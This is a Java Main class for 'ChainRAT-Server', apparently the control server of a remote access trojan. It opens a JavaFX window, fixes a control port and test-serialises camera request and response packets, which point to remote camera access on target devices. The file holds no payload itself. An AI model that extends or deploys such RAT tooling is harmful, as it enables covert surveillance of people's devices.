package com.nefi.chainrat.server;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.server.forms.frmMainController;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.ControlServer.CommandType;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraRequest;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
import com.sun.glass.ui.Size;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

public class Main extends Application {
    private static frmMainController mainController;
    private static final int PORT = 4488;
    private static Log log;
    private static GsonBuilder gsonBuilder = new GsonBuilder();
    private static Gson gson = gsonBuilder.create();
    public static Gson getGson(){
        return gson;
    }

    @Override
    public void start(Stage primaryStage) throws Exception{
        FXMLLoader loader = new FXMLLoader(getClass().getResource("forms/frmMain.fxml"));
        Parent root = loader.load();
        mainController = loader.getController();
        primaryStage.setTitle("ChainRAT-Server");
        primaryStage.setScene(new Scene(root, 800, 400));
        primaryStage.show();
    }



    public static void main(String[] args) {
        log = new Log();
        Size[] front = new Size[]{new Size(300, 300), new Size(400,400), new Size(500,500)};
        Size[] back = new Size[]{new Size(3030, 3300), new Size(4030,4300), new Size(5300,5300)};

        CameraResponse cr = new CameraResponse(front, back);

        GsonBuilder gsonBuilder = new GsonBuilder();
        Gson gson = gsonBuilder.create();

        String jsonsizes = gson.toJson(cr, CameraResponse.class);
        System.out.println("String for response: " + jsonsizes);

        Packet p = new Packet(CommandType.CAMERA_RESPONSE, jsonsizes);
        String jsonpacket = gson.toJson(p, Packet.class);
        System.out.println("String for packet:" + jsonpacket);

        System.out.println("Response extracted from packet: " + p.content);
        String filtered = p.content.replaceAll("\\\\" , "");
        System.out.println("Response filtered: " + filtered);

        launch(args);
    }

    public static frmMainController getMainController(){
        return mainController;
    }

    public static Log getLog(){
        return log;
    }

    public static int getPort(){
        return PORT;
    }
}
